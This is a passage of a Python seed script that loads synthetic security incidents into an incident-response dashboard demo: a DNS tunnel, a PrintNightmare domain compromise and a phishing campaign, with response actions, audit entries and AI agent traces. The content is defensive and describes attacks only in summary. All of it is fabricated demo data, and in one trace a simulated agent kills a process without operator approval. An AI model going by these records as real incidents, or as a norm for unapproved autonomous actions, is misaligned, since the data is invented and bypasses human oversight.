            "DNS query block applied. Tunnel domain sinkholed internally. Host isolation in progress."
        ),
        mitre_mapping=[
            {"tactic": "Exfiltration", "technique": "Exfiltration Over Alternative Protocol: DNS", "id": "T1048.003"},
            {"tactic": "Command and Control", "technique": "Application Layer Protocol: DNS", "id": "T1071.004"},
        ],
        asset_context={
            "hostname": "WS-Legal-07",
            "role": "Legal Counsel Workstation",
            "user": "k.yamamoto@corp.local",
            "segment": "Legal-VLAN"
        },
        evidence=[
            "DNS: 132,000 TXT queries to *.tunnel.malicious-ns.com in 11 hours",
            "Entropy analysis: avg 4.8 bits/char (anomaly threshold: 3.5)",
            "Volume: ~240 MB encoded in DNS payload",
            "Tool fingerprint: iodine v0.7.0 client detected in memory"
        ],
        recommended_actions=["Block DNS tunnel domain at recursive resolver", "Isolate WS-Legal-07", "Capture DNS query logs for forensics", "Reset k.yamamoto credentials"],
    )
    session.add(inc8)
    session.commit()
    session.refresh(inc8)

    ra20 = ResponseAction(
        incident_id=inc8.id,
        action_type="Sinkhole DNS Tunnel Domain",
        plugin="simulation",
        arguments={"domain": "tunnel.malicious-ns.com", "sinkhole_ip": "10.0.0.1"},
        risk="low",
        status="completed",
        simulated=True,
        requires_approval=False,
        proposed_by="ResponsePlannerAgent",
        approved_by="auto",
        result=json.dumps({"success": True, "message": "Domain sinkholed at internal DNS resolver"}),
    )
    ra21 = ResponseAction(
        incident_id=inc8.id,
        action_type="Isolate WS-Legal-07",
        plugin="simulation",
        arguments={"hostname": "WS-Legal-07", "ip": "10.10.7.33"},
        risk="medium",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    session.add(ra20)
    session.add(ra21)

    # =========================================================================
    # SCENARIO 9: PRIVILEGE ESCALATION (INC-000009)
    # Status: investigating
    # =========================================================================
    print("[*] Injecting Scenario 9: Active Directory Privilege Escalation...")

    inc9 = Incident(
        public_id="INC-000009",
        title="Active Directory Privilege Escalation (PrintNightmare Exploit)",
        incident_type="Privilege Escalation",
        severity="critical",
        confidence=0.95,
        status="investigating",
        source_ip="10.10.1.44",
        destination_ip="10.1.0.5",
        assigned_to="ResponsePlannerAgent",
        first_seen=now - timedelta(hours=1),
        last_seen=now - timedelta(minutes=5),
        summary="Low-privilege user account exploited PrintNightmare (CVE-2021-34527) against the Domain Controller DC-CORP-01. A malicious DLL was loaded by the Print Spooler service with SYSTEM privileges, granting the attacker Domain Admin rights.",
        llm_summary="PrintNightmare exploitation detected against DC-CORP-01. User 'corp\\guest_temp' loaded malicious DLL via Print Spooler. The DLL executed a net user /add command creating 'backdoor_admin' in the Domain Admins group. Domain compromise may be complete.",
        llm_report=(
            "# Incident Response Case File: INC-000009\n\n"
            "## ⚠️ CRITICAL — DOMAIN COMPROMISE\n"
            "PrintNightmare exploit used to gain Domain Admin. Treat as full domain compromise.\n\n"
            "## Threat Indicators\n"
            "- **Tactic**: Privilege Escalation (TA0004)\n"
            "- **Technique**: Exploitation for Privilege Escalation (T1068)\n"
            "- **CVE**: CVE-2021-34527 (PrintNightmare)\n"
            "- **Payload**: Malicious DLL loaded by spoolsv.exe\n\n"
            "## Backdoor Account\n"
            "Account 'backdoor_admin' added to 'Domain Admins' group. "
            "Full forest-level compromise cannot be ruled out. Reset krbtgt recommended."
        ),
        mitre_mapping=[
            {"tactic": "Privilege Escalation", "technique": "Exploitation for Privilege Escalation", "id": "T1068"},
            {"tactic": "Persistence", "technique": "Account Manipulation", "id": "T1098"},
            {"tactic": "Credential Access", "technique": "OS Credential Dumping: NTDS", "id": "T1003.003"},
        ],
        asset_context={
            "hostname": "DC-CORP-01",
            "role": "Primary Domain Controller",
            "tier": "Tier-0 Crown Jewel",
            "os": "Windows Server 2019",
            "segment": "Domain Controllers VLAN"
        },
        evidence=[
            "Windows Event 7045: Service installed by spoolsv.exe (malicious DLL)",
            "AD Audit: 'backdoor_admin' added to 'Domain Admins' at 22:47:03 UTC",
            "Zeek smb.log: DLL write to \\\\DC-CORP-01\\ADMIN$ from 10.10.1.44",
            "CVE-2021-34527 exploit pattern matched in network capture"
        ],
        recommended_actions=["Disable Print Spooler on DC-CORP-01 IMMEDIATELY", "Delete backdoor_admin account", "Reset krbtgt password TWICE (AD golden ticket mitigation)", "Force password reset for all Domain Admins"],
    )
    session.add(inc9)
    session.commit()
    session.refresh(inc9)

    ra22 = ResponseAction(
        incident_id=inc9.id,
        action_type="Disable Print Spooler Service on Domain Controller",
        plugin="simulation",
        arguments={"hostname": "DC-CORP-01", "service": "Spooler", "action": "Stop and Disable"},
        risk="medium",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra23 = ResponseAction(
        incident_id=inc9.id,
        action_type="Delete Backdoor Admin Account",
        plugin="simulation",
        arguments={"domain": "CORP", "username": "backdoor_admin", "remove_from_groups": ["Domain Admins"]},
        risk="low",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    ra24 = ResponseAction(
        incident_id=inc9.id,
        action_type="Reset krbtgt Account Password (x2)",
        plugin="simulation",
        arguments={"account": "krbtgt", "rotations": 2, "reason": "Golden ticket mitigation after DC compromise"},
        risk="high",
        status="awaiting_approval",
        simulated=True,
        requires_approval=True,
        proposed_by="ResponsePlannerAgent",
    )
    session.add(ra22)
    session.add(ra23)
    session.add(ra24)

    # =========================================================================
    # SCENARIO 10: PHISHING EMAIL CAMPAIGN (INC-000010)
    # Status: resolved
    # =========================================================================
    print("[*] Injecting Scenario 10: Spear Phishing Campaign...")

    inc10 = Incident(
        public_id="INC-000010",
        title="Targeted Spear-Phishing Campaign — Finance Department",
        incident_type="Phishing",
        severity="medium",
        confidence=0.97,
        status="resolved",
        source_ip="209.85.128.0/17",
        destination_ip="10.10.0.0/8",
        assigned_to="ThreatHunterAgent",
        first_seen=now - timedelta(days=1),
        last_seen=now - timedelta(hours=20),
        summary="48 targeted phishing emails impersonating the CFO sent to Finance department. 3 employees clicked the malicious link. No credential submission detected. Emails contained a DocuSign-branded credential harvesting page.",
        llm_summary="Spear-phishing campaign targeting Finance team impersonating CFO David Morrison. Sender spoofed from docusign-corp@gmail.com. Malicious URL led to phishing kit hosted on compromised WordPress site. 3 of 48 recipients clicked; none submitted credentials. All emails quarantined and users notified.",
        llm_report=(
            "# Incident Response Case File: INC-000010\n\n"
            "## Executive Summary\n"
            "A targeted spear-phishing campaign hit the Finance team. Quick user reporting and email filtering prevented credential theft.\n\n"
            "## Threat Indicators\n"
            "- **Tactic**: Initial Access (TA0001)\n"
            "- **Technique**: Phishing: Spearphishing Link (T1566.002)\n"
            "- **Lure**: CFO signature requesting DocuSign signature on Q4 budget\n"
            "- **Click Rate**: 6.25% (3/48 recipients)\n\n"
            "## Resolution\n"
            "All 48 emails quarantined. Malicious URL blocked at proxy. 3 clicking users interviewed — no credentials submitted. Incident closed with preventive awareness training."
        ),
        mitre_mapping=[
            {"tactic": "Initial Access", "technique": "Phishing: Spearphishing Link", "id": "T1566.002"},
            {"tactic": "Credential Access", "technique": "Steal Web Session Cookie", "id": "T1539"},
        ],
        asset_context={
            "affected_users": 3,
            "total_targeted": 48,
            "lure_sender": "docusign-corp@gmail.com",
            "phishing_kit_host": "compromised-wordpress.example.com",
            "segment": "Corporate Email"
        },
        evidence=[
            "Email gateway: 48 messages from docusign-corp@gmail.com quarantined",
            "URL: https://compromised-wordpress.example.com/docusign/secure/sign",
            "Proxy log: 3 clicks recorded — 0 POST form submissions",
            "Phishing kit: DocuSign credential harvester v3.2 (Bulletproof Hosting)"
        ],
        recommended_actions=["Send awareness email to all 48 targeted users", "Block sender domain at email gateway", "Add URL to blocklist", "Schedule phishing simulation training"],
    )
    session.add(inc10)
    session.commit()
    session.refresh(inc10)

    ra25 = ResponseAction(
        incident_id=inc10.id,
        action_type="Quarantine All Phishing Emails",
        plugin="simulation",
        arguments={"sender": "docusign-corp@gmail.com", "subject_pattern": "ACTION REQUIRED: DocuSign*", "count": 48},
        risk="low",
        status="completed",
        simulated=True,
        requires_approval=False,
        proposed_by="ThreatHunterAgent",
        approved_by="auto",
        result=json.dumps({"success": True, "message": "48 emails quarantined successfully"}),
    )
    ra26 = ResponseAction(
        incident_id=inc10.id,
        action_type="Block Phishing URL at Web Proxy",
        plugin="simulation",
        arguments={"url": "https://compromised-wordpress.example.com/docusign/", "category": "phishing"},
        risk="low",
        status="completed",
        simulated=True,
        requires_approval=False,
        proposed_by="ThreatHunterAgent",
        approved_by="auto",
        result=json.dumps({"success": True, "message": "URL blocked at Squid proxy and DNS filter"}),
    )
    session.add(ra25)
    session.add(ra26)

    # =========================================================================
    # AUDIT TRAIL ENTRIES
    # =========================================================================
    print("[*] Injecting Audit Entries...")

    audits = [
        AuditEntry(actor="ResponsePlannerAgent", action="incident_created", target_type="incident", target_id=str(inc1.id), timestamp=now - timedelta(hours=2), before_state={}, after_state={"status": "open"}),
        AuditEntry(actor="ResponsePlannerAgent", action="action_proposed", target_type="incident", target_id=str(inc1.id), timestamp=now - timedelta(hours=1, minutes=55), before_state={}, after_state={"action": "Block IP 198.51.100.12", "status": "awaiting_approval"}),
        AuditEntry(actor="ResponsePlannerAgent", action="incident_created", target_type="incident", target_id=str(inc2.id), timestamp=now - timedelta(hours=5), before_state={}, after_state={"status": "open"}),
        AuditEntry(actor="operator", action="action_approved", target_type="response_action", target_id=str(inc2.id), timestamp=now - timedelta(hours=4, minutes=30), before_state={"status": "awaiting_approval"}, after_state={"status": "approved", "approved_by": "operator"}),
        AuditEntry(actor="auto", action="action_executed", target_type="response_action", target_id=str(inc2.id), timestamp=now - timedelta(hours=4, minutes=25), before_state={"status": "approved"}, after_state={"status": "completed", "result": "C2 blocked"}),
        AuditEntry(actor="ThreatHunterAgent", action="incident_created", target_type="incident", target_id=str(inc3.id), timestamp=now - timedelta(hours=8), before_state={}, after_state={"status": "open"}),
        AuditEntry(actor="auto", action="action_executed", target_type="response_action", target_id=str(inc3.id), timestamp=now - timedelta(hours=7, minutes=30), before_state={"status": "approved"}, after_state={"status": "completed"}),
        AuditEntry(actor="operator", action="incident_closed", target_type="incident", target_id=str(inc3.id), timestamp=now - timedelta(hours=6), before_state={"status": "containing"}, after_state={"status": "mitigated"}),
        AuditEntry(actor="ResponsePlannerAgent", action="incident_created", target_type="incident", target_id=str(inc4.id), timestamp=now - timedelta(minutes=45), before_state={}, after_state={"status": "open", "severity": "critical"}),
        AuditEntry(actor="ResponsePlannerAgent", action="actions_proposed", target_type="incident", target_id=str(inc4.id), timestamp=now - timedelta(minutes=40), before_state={}, after_state={"actions_count": 3, "status": "awaiting_approval"}),
        AuditEntry(actor="ResponsePlannerAgent", action="incident_created", target_type="incident", target_id=str(inc5.id), timestamp=now - timedelta(hours=1, minutes=20), before_state={}, after_state={"status": "open"}),
        AuditEntry(actor="ThreatHunterAgent", action="incident_created", target_type="incident", target_id=str(inc6.id), timestamp=now - timedelta(days=2), before_state={}, after_state={"status": "open"}),
        AuditEntry(actor="operator", action="action_approved", target_type="response_action", target_id=str(inc6.id), timestamp=now - timedelta(days=1, hours=18), before_state={"status": "awaiting_approval"}, after_state={"status": "approved"}),
        AuditEntry(actor="auto", action="action_executed", target_type="response_action", target_id=str(inc6.id), timestamp=now - timedelta(days=1, hours=17, minutes=50), before_state={"status": "approved"}, after_state={"status": "completed"}),
        AuditEntry(actor="operator", action="incident_resolved", target_type="incident", target_id=str(inc6.id), timestamp=now - timedelta(days=1, hours=12), before_state={"status": "containing"}, after_state={"status": "resolved"}),
        AuditEntry(actor="ResponsePlannerAgent", action="incident_created", target_type="incident", target_id=str(inc7.id), timestamp=now - timedelta(hours=3), before_state={}, after_state={"status": "open", "severity": "critical"}),
        AuditEntry(actor="ResponsePlannerAgent", action="incident_created", target_type="incident", target_id=str(inc8.id), timestamp=now - timedelta(hours=12), before_state={}, after_state={"status": "open"}),
        AuditEntry(actor="auto", action="action_auto_executed", target_type="response_action", target_id=str(inc8.id), timestamp=now - timedelta(hours=11), before_state={}, after_state={"status": "completed", "action": "DNS sinkhole applied"}),
        AuditEntry(actor="ResponsePlannerAgent", action="incident_created", target_type="incident", target_id=str(inc9.id), timestamp=now - timedelta(hours=1), before_state={}, after_state={"status": "open", "severity": "critical"}),
        AuditEntry(actor="ThreatHunterAgent", action="incident_created", target_type="incident", target_id=str(inc10.id), timestamp=now - timedelta(days=1), before_state={}, after_state={"status": "open"}),
        AuditEntry(actor="auto", action="emails_quarantined", target_type="incident", target_id=str(inc10.id), timestamp=now - timedelta(hours=23), before_state={}, after_state={"quarantined": 48}),
        AuditEntry(actor="operator", action="incident_resolved", target_type="incident", target_id=str(inc10.id), timestamp=now - timedelta(hours=20), before_state={"status": "containing"}, after_state={"status": "resolved"}),
    ]
    for a in audits:
        session.add(a)

    # =========================================================================
    # AGENT RUNS — Multiple AI-driven analysis sessions
    # =========================================================================
    print("[*] Injecting Agent Runs & Tool Calls...")

    run1 = AgentRun(
        incident_id=inc1.id,
        task="Analyze this critical exfiltration event and recommend containment.",
        started_at=now - timedelta(hours=1, minutes=50),
        ended_at=now - timedelta(hours=1, minutes=45),
        provider="google",
        model="models/gemini-2.5-flash",
        status="completed",
        final_response=json.dumps({
            "summary": "15.2 GB database backup exfiltration to Russian IP confirmed.",
            "reasoning_summary": "IsolationForest score 0.97. Destination IP is known bad actor. Recommend triple-layer response: block IP, isolate host, forensic capture.",
            "report": "Analysis complete. Critical severity exfiltration alert confirmed with 98% confidence."
        }),
        usage_metadata={"input_tokens": 2847, "output_tokens": 892, "tool_calls_made": 3}
    )
    session.add(run1)
    session.commit()
    session.refresh(run1)

    t1 = ToolCall(agent_run_id=run1.id, tool_name="query_events", sanitized_arguments={"ip": "192.168.12.44"}, started_at=now - timedelta(hours=1, minutes=49), ended_at=now - timedelta(hours=1, minutes=48), result_summary="Found 10 data flow events totaling 15.2 GB.", status="completed")
    t2 = ToolCall(agent_run_id=run1.id, tool_name="check_threat_intel", sanitized_arguments={"ip": "198.51.100.12"}, started_at=now - timedelta(hours=1, minutes=48), ended_at=now - timedelta(hours=1, minutes=47), result_summary="IP is on AbuseIPDB (96% malicious), AlienVault OTX (Russia, data exfil dropzone).", status="completed")
    t3 = ToolCall(agent_run_id=run1.id, tool_name="propose_action", sanitized_arguments={"action_type": "Block Outbound Host Destination", "risk": "medium"}, started_at=now - timedelta(hours=1, minutes=47), ended_at=now - timedelta(hours=1, minutes=46), result_summary="3 actions proposed — awaiting operator approval.", status="completed")
    session.add(t1)
    session.add(t2)
    session.add(t3)

    run2 = AgentRun(
        incident_id=inc2.id,
        task="Analyze C2 beaconing pattern and propose containment for Cobalt Strike activity.",
        started_at=now - timedelta(hours=4, minutes=45),
        ended_at=now - timedelta(hours=4, minutes=38),
        provider="google",
        model="models/gemini-2.5-flash",
        status="completed",
        final_response=json.dumps({
            "summary": "Cobalt Strike C2 beacon confirmed via JA3 fingerprint matching.",
            "reasoning_summary": "Traffic pattern, JA3 hash, and beacon interval all match Cobalt Strike default profile. EDR confirms injected svchost. Isolate immediately.",
            "report": "C2 beaconing analysis complete. High confidence Cobalt Strike activity."
        }),
        usage_metadata={"input_tokens": 3102, "output_tokens": 1247, "tool_calls_made": 4}
    )
    session.add(run2)
    session.commit()
    session.refresh(run2)

    t4 = ToolCall(agent_run_id=run2.id, tool_name="query_events", sanitized_arguments={"ip": "10.10.5.88"}, started_at=now - timedelta(hours=4, minutes=44), ended_at=now - timedelta(hours=4, minutes=43), result_summary="42 periodic outbound connections to 203.0.113.80 at 60-second intervals.", status="completed")
    t5 = ToolCall(agent_run_id=run2.id, tool_name="ja3_fingerprint_lookup", sanitized_arguments={"hash": "51b7ad5a09e7d00fbfaeaab03d1680c5"}, started_at=now - timedelta(hours=4, minutes=43), ended_at=now - timedelta(hours=4, minutes=42), result_summary="JA3 hash matches known Cobalt Strike beacon profile (confidence: 98%).", status="completed")
    t6 = ToolCall(agent_run_id=run2.id, tool_name="kill_process", sanitized_arguments={"hostname": "WS-Finance-09", "pid": 4821}, started_at=now - timedelta(hours=4, minutes=42), ended_at=now - timedelta(hours=4, minutes=41), result_summary="Malicious svchost.exe process terminated successfully.", status="completed")
    t7 = ToolCall(agent_run_id=run2.id, tool_name="propose_action", sanitized_arguments={"action_type": "Isolate Workstation WS-Finance-09"}, started_at=now - timedelta(hours=4, minutes=41), ended_at=now - timedelta(hours=4, minutes=40), result_summary="Isolation action proposed — awaiting operator approval.", status="completed")
    session.add(t4)
    session.add(t5)
    session.add(t6)
    session.add(t7)

    run3 = AgentRun(
        incident_id=inc4.id,
        task="Analyze ransomware pre-encryption indicators and recommend immediate containment.",
        started_at=now - timedelta(minutes=38),
        ended_at=now - timedelta(minutes=32),
        provider="google",
        model="models/gemini-2.5-flash",
        status="completed",
        final_response=json.dumps({
            "summary": "Ransomware pre-encryption stage confirmed. Shadow copy deletion + AV disable detected.",
            "reasoning_summary": "vssadmin.exe + wmic defender disable is a classic ransomware staging sequence. Lateral SMB movement detected. CRITICAL: immediate isolation required within next 5 minutes to prevent file encryption.",
            "report": "CRITICAL ALERT: Ransomware staging on WS-Dev-23. Estimated time to encryption start: <10 minutes."
        }),
        usage_metadata={"input_tokens": 1892, "output_tokens": 743, "tool_calls_made": 2}
    )
    session.add(run3)
    session.commit()
    session.refresh(run3)

    t8 = ToolCall(agent_run_id=run3.id, tool_name="query_edr", sanitized_arguments={"hostname": "WS-Dev-23"}, started_at=now - timedelta(minutes=37), ended_at=now - timedelta(minutes=36), result_summary="vssadmin.exe + wmic.exe AV disable detected. Memory: ransom dropper found in %AppData%\\svchost.dll", status="completed")
    t9 = ToolCall(agent_run_id=run3.id, tool_name="propose_action", sanitized_arguments={"action_type": "Emergency Host Isolation", "priority": "critical"}, started_at=now - timedelta(minutes=36), ended_at=now - timedelta(minutes=35), result_summary="3 emergency actions proposed for operator immediate approval.", status="completed")
    session.add(t8)
    session.add(t9)

    session.commit()
    print("[+] All 10 demo scenario data injected successfully!")
    print(f"    - {10} incidents (critical x4, high x3, medium x2, low x1)")
    print(f"    - Multiple statuses: awaiting_approval, investigating, containing, mitigated, resolved")
    print(f"    - Pending approval queue: INC-000001, INC-000004, INC-000005, INC-000007, INC-000008, INC-000009")
    print(f"    - {3} agent runs with tool call traces")
    print(f"    - {22} audit trail entries")


def main() -> None:
    create_db_and_tables()
    with Session(engine) as session:
        clear_db(session)
        inject_data(session)


if __name__ == "__main__":
    main()
